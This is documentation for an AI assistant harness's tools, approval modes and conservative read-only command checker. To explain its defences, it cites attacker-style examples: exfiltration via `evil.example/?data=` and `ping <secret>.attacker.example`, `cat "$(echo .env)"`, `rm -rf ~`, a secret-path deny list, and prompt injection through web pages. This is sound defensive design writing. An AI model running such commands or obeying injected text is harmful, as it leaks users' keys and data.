**English** | [简体中文](../zh-CN/tools-and-permissions.md)

[ZhiFox](../../README.md) › [Documentation](../../README.md#documentation) › Tools and permissions

# Tools and permissions

What the assistant can call, and when it has to ask you first. The optional sandbox, secret masking and your own hooks
are in [Sandbox, secret masking and hooks](sandbox-and-hooks.md); MCP servers, skills and agents are in
[Extensions](extensions.md).

## Three kinds of tools

The difference is who writes the spec and who runs the tool:

| Kind | Spec written by | Runs on | Examples here |
|---|---|---|---|
| Custom tools | Us | Your computer | To-dos ([todo.py](../../harness/tools/todo.py)), scheduled tasks ([tasks.py](../../harness/tools/tasks.py)), running commands ([shell.py](../../harness/tools/shell.py)), reading skills ([skill.py](../../harness/tools/skill.py)), reading a web page for models without web tools ([fetch.py](../../harness/tools/fetch.py)), sending a file into the chat (chat channels only, [send.py](../../harness/tools/send.py)) |
| Anthropic-defined tools | Anthropic | Your computer | Reading and writing files ([files.py](../../harness/tools/files.py); viewing an image returns the image itself, decided by its first bytes rather than its extension; models that can't see images, like DeepSeek, get a note instead), memory ([memory.py](../../harness/tools/memory.py)), the browser and computer use for Claude ([browser.py](../../harness/tools/browser.py), [computer.py](../../harness/tools/computer.py)) |
| Server tools | Anthropic | Anthropic's servers | Web search ([web.py](../../harness/tools/web.py)) |

Claude learned the specs of the second kind during training, so for Claude a one-line declaration is enough. Other
providers' models haven't, so `files.py` and `memory.py` also carry a hand-written spec (`PORTABLE`) for them, the
browser has a set of twelve hand-written stand-ins and computer use a set of nine; the code that runs is the same. Tools of the third kind live on
Anthropic's servers, so other providers' models can't use them.

A fourth kind arrives through MCP: the spec is written by whoever made the MCP server, and the tool runs in their
program, on your computer or on a remote service. Every provider can use them.

## Several reads in one step run at the same time

One reply from the model can ask for several tools at once: "read these five files and list those two folders". Run one
after another, you wait for every read added up. They don't depend on each other (they only read), so ZhiFox runs them at
the same time and you wait only for the slowest one ([harness/parallel.py](../../harness/parallel.py)).

**Which calls.** A call joins a batch only if all three hold, and only together with the calls right next to it:

1. **The tool says this call only reads** (`Tool.parallel`, opt-in, off by default: a new tool counts as one that changes
   things). Today that is viewing a file or listing a folder (the file tool's `view`), viewing memory, listing to-dos,
   listing scheduled tasks and reading a skill.
2. **It doesn't need asking at all.** The same `permissions.review` that decides whether to show you a card says no. A
   call that would normally ask but your approval mode lets through (reading outside the working folder under "Read-only
   commands without asking", any read under "Allow everything") still runs alone, so its "auto-allowed" mark is recorded
   before it runs, exactly as before.
3. **None of your `PreToolUse` [hooks](sandbox-and-hooks.md#hooks-your-own-scripts-at-fixed-moments) looks at it.** Such a hook may ask you to
   confirm, and confirmations come one at a time. `PostToolUse` hooks are fine: they run after the result, in call order.

Everything else (commands, edits, the browser, computer use, MCP tools, subagents, `send_file`, anything that asks you)
runs alone and in order, as it always did, so one step can split into `[read, read] [edit: asks you] [read, read, read]`.
Why "only looks" isn't enough: scrolling and taking a screenshot only look too, but they share one browser, and which comes
first changes what you see; a subagent changes nothing itself but runs a whole loop of its own. So this is its own switch,
not the rewind list of read-only actions (every call that may run together is on that list, and a test checks it).

**What you see stays in order.** The thread pool (at most `config.MAX_PARALLEL_TOOLS`, 4) only runs the tool itself, each
call in a copy of the turn's `contextvars` context (so the undo journal is still visible). The cards, approvals, hooks,
secret masking and the results sent back to the model all happen on the turn's own thread, one call after another in the
order the model asked: the first card appears once the whole batch has started, and the next ones usually arrive already
finished. That is on purpose: the page draws a result into the card just before it (the events carry no IDs), rewinding a
turn reads the same order to see what was done, and a replayed conversation looks exactly like the live one. The only
place you see that calls overlapped is the [run trace](architecture.md#reading-a-turn-the-run-trace).

**Stopping.** Stop (Ctrl-C in the terminal) takes effect the next time the loop touches the interface, as with any tool.
Calls that haven't started never start; the few that are running are reads, so their results are just dropped. Every call
still gets a result in the history ("interrupted"), as before.

## Commands remember their folder

Every `run_command` call starts a new shell, but the folder carries over, the way Claude Code's Bash tool works: the
first command of a conversation runs in the working folder, and each later one starts where the previous one ended. So
`cd sub` in one command and `make` in the next runs `make` in `sub`. Environment variables (`export`, `$env:`), aliases
and functions still don't carry over, so every command stands on its own; the tool's description says so, and also
that the file tools' relative paths stay relative to the working folder.

**How ZhiFox knows where a command ended.** The command is wrapped: in bash a `trap … EXIT` set on the line before it,
in PowerShell `try { … } finally { … }`. When the command ends (normally, with an error, or with `exit`), the shell
prints one line holding a random marker and its folder (bash's `$PWD`, so a folder entered through a symlink such as
`/tmp` keeps that spelling; in PowerShell `(Get-Location -PSProvider FileSystem).ProviderPath`). ZhiFox takes that line
out again, so the model sees exactly the output it saw before, and the exit code is kept (PowerShell's rule, "0 if the
last command succeeded, 1 if it didn't, unless it called `exit`", is reproduced). Two visible differences: bash error
messages count one line more (`line 2:`), because the trap sits on the line before the command, and a command that
redirects its own output to a file (`exec > log`) doesn't get the marker written into your file; ZhiFox then simply
keeps the previous folder. The model could read the wrapper and print a fake marker, or just `cd` anywhere: that gains
it nothing, because the folder only decides where the next command starts, and that command is still reviewed in that
folder (below). See [harness/tools/cwd.py](../../harness/tools/cwd.py).

**When it goes back to the working folder.** A new conversation. Reopening or forking a saved conversation: the folder
isn't restored (it may be gone, or no longer where you want it), and if the history ran commands, the first command's
result tells the model that its earlier `cd` no longer applies. A subagent: its own shell starts in the working folder
and its `cd` doesn't move its caller (it starts with an empty history, like a new conversation, so the task handed to it
should say where to work). A remembered folder that has been deleted, or that a sandboxed command may not start in (see [Sandbox for commands](sandbox-and-hooks.md#sandbox-for-commands-what-a-command-can-reach)): the
command runs in the working folder and its result says why. A command that times out, is stopped or is killed leaves
the folder where it was, because where it stopped is anyone's guess.

**Approvals follow the folder.** Whenever a command won't run in the working folder, its approval card adds a line
"Runs in this folder: …" (web UI, terminal and chat channels). **Allow read-only commands** judges relative paths
from that folder, and checks the folder itself too: after `cd data`, a plain `ls` lists ZhiFox's data folder, so it
asks. The card, the read-only check and the run all use the same folder; if it disappears after you were asked, the
command doesn't quietly run somewhere else: it isn't run, and the model is told to run it again (it will be reviewed in
the working folder). [Hooks](sandbox-and-hooks.md#hooks-your-own-scripts-at-fixed-moments) get the folder as `command_cwd`; `cwd` stays the
working folder, where the hook itself runs. With the [sandbox](sandbox-and-hooks.md#sandbox-for-commands-what-a-command-can-reach) on, a
command can start in the working folder, the run's own home and temp folders, or one of your extra paths (a read-only
one too, where it still can't write). Any other folder (a system folder, or one left by a command you let run outside
the sandbox or from before the sandbox was switched on) sends it back to the working folder: bwrap couldn't even enter
a folder the sandbox doesn't show, and the rule stays the same on both systems. [Editing or regenerating](conversations.md#editing-the-last-message-and-regenerating) the last turn starts that turn again in the
folder it originally started in, so the rerun matches the history that's left.

## Permissions

| Action | Handling |
|---|---|
| To-dos, memory | Runs directly (only touches the assistant's own files in `data/`) |
| Reading an enabled skill | Runs directly (read-only, and it can't leave that skill's folder). A skill's scripts run through `run_command`, so they ask |
| Handing a task to a subagent (`agent`) | Runs directly (it only calls a model). Every tool call the subagent makes is reviewed by this same table, with its caller's approval mode, and the card says which agent is asking |
| Adding or deleting a reminder | Runs directly (at the set time it only shows a reminder: no model call, no cost) |
| Adding or deleting a task the assistant runs on its own | Asks you first, and shows the schedule and the instruction (it will spend money later, with nobody watching) |
| Reading files in the working directory | Runs directly |
| Reading files outside the working directory | Asks you first. In **Allow read-only commands** mode it runs directly, unless the path is `data/`, a key file or looks like it holds secrets |
| Reading files in `data/` (saved conversations, settings) | Asks you first, even when `data/` is inside the working directory |
| Creating or changing any file | Asks you first, and shows what will be written |
| Running any shell command | Asks you first, and shows the full command. In **Allow read-only commands** mode, a command ZhiFox can tell only looks runs directly (see [Read-only commands](#read-only-commands-and-why-the-check-is-conservative); on Windows every command still asks). With the sandbox on, the card also says which level the command runs in (see [Sandbox for commands](sandbox-and-hooks.md#sandbox-for-commands-what-a-command-can-reach)). When an earlier command `cd`'d elsewhere, it says which folder the command runs in, and the read-only check looks at that folder (see [Commands remember their folder](#commands-remember-their-folder)) |
| Running one command outside the sandbox (`unsandboxed: true`, only while the sandbox is on) | Asks every time, in every mode, Allow everything included, with a warning on the card and no way to stop asking. A scheduled task or chat channel set to Allow everything can't ask at all, so there it is refused |
| Any command while the sandbox is on but can't work on this computer | Refused without asking; the model is told why and how to fix it or switch the sandbox off |
| Web search | Runs directly (on Anthropic's servers, without touching your computer), with a cap on the number of searches |
| Reading a web page (`web_fetch`, models without web tools): a site already read in this conversation | Runs directly |
| Reading a web page: a site not yet read in this conversation | Asks you first, and shows the full address (it is sent to that site). Once allowed, that site doesn't ask again in this conversation. Allow read-only commands and Allow file edits still ask; Allow everything doesn't. Addresses on this computer or your network are refused without asking (see [Reading a web page](browser-and-computer-use.md#reading-a-web-page-without-a-browser-web_fetch)) |
| Calling an MCP server's tool | Asks you first, and shows the arguments that will be sent, unless you set that tool (or the whole server) to don't ask |
| Browser: reading a page, taking a screenshot, scrolling, switching tabs | Runs directly (in ZhiFox's own browser, which holds none of your logins) |
| Browser: opening a site already visited in this conversation; back, forward, reload | Runs directly |
| Browser: opening a site not yet visited in this conversation | Asks you first. Once allowed, that site doesn't ask again in this conversation |
| Browser: clicking a plain link or button | Runs directly |
| Browser: clicking something that submits a form, a button or link named like buy, pay, send, delete, confirm… (in English, Chinese and Spanish), or anything inside a frame from another site | Asks you first, and shows the button and the page |
| Browser: typing or filling in text (and key presses that type) | Asks you first, and shows the page, the field and the text |
| Browser: typing into a password or card field, or into a frame from another site | Asks in every mode, with a warning on the card. A password is never shown on the card, only its length |
| Browser: opening an address that isn't a web page (`about:`, `data:`…) | Asks every time, in every mode |
| Browser: opening `file:`, `chrome:`, `devtools:`, `javascript:` or `view-source:` | Refused outright; the model is told why |
| Computer use: a screenshot or a zoom | Asks you first; Allow read-only commands and Allow file edits don't change that. In the web chat the card lets you stop being asked about screenshots in this conversation. Runs directly under Allow everything |
| Computer use: clicking, dragging, moving the mouse, scrolling, typing, pressing keys | Asks you first; Allow read-only commands and Allow file edits don't change that. The card shows where (and whose window), the keys or the text. In the web chat it lets you stop being asked about clicks and typing in this conversation, and explains the risk. Runs directly under Allow everything |
| Computer use: a dangerous key combination (⌘Q or ⌘⌥Esc on a Mac, Alt+F4 or Ctrl+Alt+Del elsewhere…) | Asks every time, in every mode and whatever you allowed in the conversation, with a warning on the card and no way to stop asking |
| Computer use: waiting, reading the cursor position | Runs directly (they neither look nor touch) |
| Computer use: anything while a blocked app is in front or under the click, or while another run holds the screen | Refused without asking; the model is told why |
| Sending a file into the chat (`send_file`, chat channels only) | Asks you first, in the chat (and on the page), unless the channel is set to Allow everything. The card shows the file, its size, whether it goes as a photo, the caption and the chat it goes to. A file in `data/` asks with a warning, like reading it. The files that hold secrets (`.env`, `data/mcp.json`, `data/channels.json`) are never sent, in any mode, and files a platform won't take (too big, wrong kind) are refused without asking |

An MCP tool is someone else's program. ZhiFox can't see what it does, and what it says about itself ("read-only")
isn't verified, so every call asks by default. In **Extensions → MCP** you can mark one tool, or a whole server, as
**don't ask**. That is your decision about one specific tool, so it is saved in `data/mcp.json` and applies in every
mode, and those calls are still marked **Allowed automatically** in the conversation. The one exception is a scheduled
task running on its own: it follows only its own approval mode, so an MCP call waits for your approval unless that
task is set to Allow everything.

Reading `data/` always asks because otherwise the model could quietly read every past conversation and send it to the
provider you're using now, whether because you asked "what files are in this folder?" or because a web page misled it.

Sending a file into a chat asks for the same reason: the file leaves your computer for the platform's servers and can't
be taken back, and the request may come from a model misled by a page or a file, even though it's your own chat. Allow
file edits relaxes editing files, not sending them, so it still asks there.

The browser rules follow one question: can this step send something out? Looking can't, because the browser holds none
of your accounts. Typing can (the text may be your information), and so can submitting a form. So can opening a new
site, because an address carries data with it: `evil.example/?data=<your mail>`. A click on a link already on the page
doesn't ask: the site put that link there, so it can't carry anything the page doesn't already have. Password and card
fields are what a misled model would want most, so they ask even under **Allow everything**, as does typing into a
frame from another site (ZhiFox can't see what's inside; it's often a payment form). Sites allowed in a conversation
are remembered by that conversation's browser session only, so a new conversation asks again. Scheduled tasks and chat
channels apply the same rules with their own approval mode.

Computer use is stricter by default because it touches your whole computer, any text on the screen can mislead the
model, and ZhiFox sees only pixels, so it can't tell you what a click will do (see
[Computer use](browser-and-computer-use.md#computer-use-your-whole-desktop-advanced)). So the modes that loosen commands and files don't loosen
it. But a question at each of dozens of steps teaches you to click Allow without looking, so you decide: in the web
chat, the approval card lets you stop being asked about screenshots, or about clicks and typing, for the one
conversation you're watching (a new conversation asks again; tasks and channels never get it), and **Allow
everything** covers computer use too. What never loosens: dangerous key combinations ask every time, blocked apps are
refused, the last look before acting still runs, and the indicator's Stop is always there.

When you deny a step, you can type a sentence (for example, "Don't delete it, move it to the Trash instead"), and it is
passed on to the model.

If you'd rather not approve every step, you can loosen when ZhiFox asks. In the web UI, use the **Ask every time** button
below the input box; in the terminal, use `/auto`:

| Option | Terminal command | Effect |
|---|---|---|
| Ask every time (default) | `/auto ask` | Everything marked "Asks you first" above asks, every time |
| Allow read-only commands | `/auto readonly` | Commands that only look (`ls`, `cat`, `grep`, `df`, `ps`, `git status`, `git log`, `systemctl status`, `journalctl`, `docker ps`…), your own commands that don't ask, and reading files outside the working directory no longer ask. Commands that could change something, file edits, reading `.env`, `data/` or places like `~/.ssh`, MCP, browser steps, sending files and computer use still ask |
| Allow file edits | `/auto edits` | Creating and changing files in the working directory no longer asks. Running commands, reading or writing outside the working directory, reading `data/`, browser steps and computer use still ask |
| Allow everything | `/auto all` | Nothing asks, computer use included, except the browser steps marked "in every mode" above and dangerous key combinations in computer use |

This only changes whether ZhiFox asks. Steps that ran without asking are marked **Allowed automatically** on their tool card in
the web UI, and noted as "(allowed automatically)" in the terminal; a read-only command says **Allowed automatically
(read-only)**, one of your own commands **Allowed automatically (your command)**. The choice isn't saved: every launch starts again at Ask
every time, so you can't turn it on and forget about it.

Scheduled tasks don't follow this choice. Each agent task has its own setting with the same four options, chosen in the
task editor and saved with the task (it defaults to Ask every time). Loosening the chat when you're watching says nothing
about a task that runs at 3 a.m. Tasks the assistant creates for you are always Ask every time, and its tool has no way
to change that: only you can, in the page. Otherwise a model misled by a web page could set itself a task that runs any
command, unasked, every night.

Scheduled tasks are the exception. When one runs on its own, every step marked "Asks you first" pauses the run until you
answer, whichever option you chose: loosening the prompts means "I'm here, go ahead", which isn't true at 3 a.m. (see
[Scheduled and recurring tasks](scheduled-tasks.md)).

Two hard limits apply regardless of any prompt: the assistant can't read or write `.env` (which holds your API keys),
and the commands it runs can't see those keys either.

A risk to understand: unless you turn on the [sandbox](sandbox-and-hooks.md#sandbox-for-commands-what-a-command-can-reach), the approval
prompt is the only checkpoint between you and the model. Before approving a command, check what it does, especially
right after the assistant has read a web page or an unfamiliar file, because that content may contain text designed to
mislead the model. The sandbox doesn't change what is asked; it limits what an allowed command can reach.

### Read-only commands, and why the check is conservative

**Allow read-only commands** exists for one situation: you look after a server from your phone ("how full is the disk?",
"is nginx running?", "show me the last 50 lines of its log") and being asked before every `df -h` is tiresome, but
**Allow everything** would let anything run unasked. In this mode, a command that only looks runs straight away and is
marked **Allowed automatically (read-only)**; a command that could change something still asks, in the conversation, in
the task, in the chat. It sits between Ask every time and Allow file edits because the worst it can do is let the model
see something (and the places worth hiding are excluded, below), while file edits really change things. It does not
include file edits, and Allow file edits does not include read-only commands: the two loosen different things.

**On Windows the mode doesn't skip any command.** Commands there run in PowerShell, and everything below is written for
bash. PowerShell has its own syntax (`@(…)` and `$(…)`, `{ script blocks }`, the `&` call operator, backtick escapes,
`--%`, drives such as `HKLM:` and `Env:` that `Get-Content` can read) and an alias for almost every command (`ls`, `cat`
and `rm` all exist), so a command that looks harmless by bash's rules can mean something else. Rather than guess,
every command asks on Windows, the commands you added included, and the page says why. Reading files outside the
working folder without asking still applies.

How ZhiFox decides ([harness/commands/](../../harness/commands/)), step by step:

1. **Words** ([words.py](../../harness/commands/words.py)). The command is split the way bash would, but only the plainest
   part of bash is understood: words, single quotes, double quotes without `$` or backticks, backslash escapes, a `~` at
   the start of a word, `|`, `;`, `&&` and `||` between stages, and output thrown away or merged: `2>/dev/null`,
   `>/dev/null`, `&>/dev/null`, `>>/dev/null`, `2>&1`, `>&2` (the target exactly `/dev/null`, unquoted). Anything else
   (a single `&`, any other `>`, `<`, `$(…)`, `` ` ``, `$VAR`, `{`, `NAME=value` in front, comments, newlines,
   invisible characters such as zero-width spaces) means "can't be read with certainty", and the command asks. Each of
   these makes what you see differ from what runs: `cat "$(echo .env)"` reads `.env`, `echo hi > notes.txt` overwrites
   a file. Chains and `/dev/null` were added after the first real eval runs, where all three models wrote read-only
   commands such as `du -sk dir 2>/dev/null | sort -rn` and `git log -1 && git show HEAD` and were asked every time.
   **Wildcards** (`*`, `?` and plain brackets such as `[ab]` or `[!.]`, unquoted) are expanded first, the way bash is
   about to, in the folder the command runs in ([globs.py](../../harness/commands/globs.py)), and every path they turn
   into is checked like any other: `du -sk */` is fine in a project folder and asks if one of the folders is `data/`;
   `cat .e*` asks because it matches `.env`; a file named `-delete` turns `find *` into `find -delete …`, which asks. A
   pattern that matches nothing is passed on as it is (bash's default), `.*` also counts `.` and `..` (as the bash 3.2
   on macOS does), and more than `READONLY_GLOB_MAX` matches asks. Ranges (`[a-z]`, which bash reads differently per
   locale), `[^a]` and character classes (`[:alpha:]`) aren't understood and ask. A wildcard in the program's name asks,
   and commands you add yourself can't contain one.
2. **Programs** ([rules.py](../../harness/commands/rules.py), and the checks that read a command closely, one file per kind of
   program: [rules_system.py](../../harness/commands/rules_system.py), [rules_files.py](../../harness/commands/rules_files.py),
   [rules_search.py](../../harness/commands/rules_search.py), [rules_text.py](../../harness/commands/rules_text.py),
   [rules_subcommands.py](../../harness/commands/rules_subcommands.py), [rules_wrappers.py](../../harness/commands/rules_wrappers.py)).
   Only programs on a built-in list count, each with its own
   rule about which options are fine: `find` without `-exec`, `-delete` or `-fprint`; `sed` without `-i`, and only a
   script made of simple commands (no `w`, `r` or `e`); `awk` without `system`, `getline`, `>` or `|` anywhere in the
   program; `sort` without `-o`; `git` only for `status`, `log`, `diff`, `show`, `branch` (listing) and a few more, with no
   options before the subcommand (`git -c core.pager=…` can run anything); `journalctl` without `--vacuum…`; `docker
   ps|logs|images`; `kubectl get|describe|logs`, never Secrets; `crontab -l` and nothing else. GNU tools accept
   abbreviations (`sort --out=x` is `--output=x`), so a forbidden long option is forbidden in every abbreviation; BSD
   tools on macOS stop reading options at the first file (`uniq a.txt -c` writes a file named `-c`), so a word that looks
   like an option after a file counts as a file too. Shells and interpreters (`bash`, `python -c`), wrappers that run
   anything (`sudo`, `xargs`, `nohup`), pagers (`less` can run commands) and `env`/`printenv` (environment variables
   often hold keys) are never read-only. Neither is anything that touches the network (`curl`, `ping`, `dig`, `ssh`): a
   read-only command that can reach the network can send out what another one just read, and even a domain name to
   look up can carry data (`ping <secret>.attacker.example`).
3. **Paths** ([paths.py](../../harness/commands/paths.py)). Every word is treated as a possible path (an option's value, the
   part after `HEAD:` in `git show HEAD:.env` too), resolved through symlinks and compared case-insensitively, because
   macOS treats `.ENV` as `.env`. Reading ZhiFox's key files, `data/`, or a place that looks like it holds secrets
   (`~/.ssh`, `~/.aws`, `.env*`, `*.pem`, `id_rsa*`, `*credential*`, shell history, `.git/config`, `/proc/*/environ`, `/dev`)
   asks, even with a plain `cat`. A command that reads a whole folder (`grep -r`, `rg`, `diff` of two folders) also asks
   if the folder contains any of these, or a symlink to another folder, or is too big to look through
   (`READONLY_SCAN_ENTRIES`); one that only lists names (`find`, `ls -R`, `du`, `tree`) asks if the folder contains `data/`.
4. **Pipes and chains.** `ps aux | grep nginx` and `ls src; git status && git diff` count only when every stage is
   read-only on its own, so `ls; rm -rf ~` still asks. `cd` isn't on the list, so a chain that changes folder asks too:
   the later commands would run somewhere other than where their paths were checked.

Why so strict? The two possible mistakes don't cost the same. Asking about a command that was harmless costs you one
tap. Letting through a command that wasn't can cost a deleted folder or a key sent to a provider. So every unclear case
goes to "ask", and the check never tries to guess what a clever command really does. The price is that some harmless
commands still ask (`awk '$3 > 100'` contains `>`; `grep -r TODO .` in a project that contains `.env`); the
[test table](../../tests/test_commands.py) lists hundreds of commands both ways, including those costs and every bypass
found while building it.

**Your own commands that don't ask.** Commands you trust that aren't read-only (`npm test`, `make check`,
`./scripts/status.sh`) can be added in **Settings → Commands that don't ask** (also linked from the approval dialog) or
with `harness commands add "npm test"` / `list` / `remove`. An entry matches by its first words: `npm test` covers
`npm test -- --watch` but not `npm testing`, so only add commands you're happy to run with anything after them. Entries
go through the same word splitting (no `;`, `|`, `$(`…), programs that can run anything (`bash`, `sudo`, `env`, `xargs`,
an interpreter without a script) can't be added, an entry never counts inside a pipe (`cat x | python …` would run
whatever comes through the pipe), and the path checks still apply. The list lives in `data/commands.json` (mode 600),
which the file tools can neither read nor change, like `.env` and `mcp.json`; the model has no tool that edits it.
ZhiFox rereads the file when it changes, so `harness commands add` works while the server is running.

Tunables are in `config.py`: `READONLY_MAX_CHARS` (2,000; longer commands always ask), `READONLY_SCAN_ENTRIES` (3,000),
`MAX_ALLOWED_COMMANDS` (100), `MAX_ALLOWED_COMMAND_CHARS` (200) and `ALLOWED_COMMANDS_DEFAULT` (empty).
Limits worth knowing: the secret-name list is a guess, so it only ever adds questions; a hard link to a file in `data/`
made outside ZhiFox isn't recognised (one to a key file is); and this mode does let the model read files outside the
working directory, which Ask every time and Allow file edits don't.

## Build your own tool

Create `harness/tools/dice.py`:

```python
import random

from .base import Tool, function_tool


def make_dice_tool() -> Tool:
    def roll_dice(sides: int = 6) -> str:
        return f"Rolled a {random.randint(1, sides)}"

    return function_tool(
        name="roll_dice",
        description="Roll a die once and return the result. Use it when the user wants a random number, a coin flip or a random pick.",
        properties={"sides": {"type": "integer", "description": "How many sides the die has; defaults to 6"}},
        required=[],
        function=roll_dice,
    )
```

Then import it in [`harness/tools/__init__.py`](../../harness/tools/__init__.py) and add a line `make_dice_tool(),` to the list
in `build_registry`. Restart, and ask the assistant to roll a die for you. Tools created with `function_tool` work with
all four providers' models. (The built-in tools write their specs in Chinese; yours can be in any language the model
reads.)

A few notes:

- The `description` is the only thing the model has to decide whether to call the tool. Besides what it does, say
  **when it should be used**.
- What a tool returns is text for the model to read. On failure, raise `ToolError("reason")` (also importable from
  `.base`); the model sees the reason and adjusts.
- If the new tool changes anything on your computer, add a rule for it in `review` in
  [harness/permissions.py](../../harness/permissions.py) so that it asks you first.
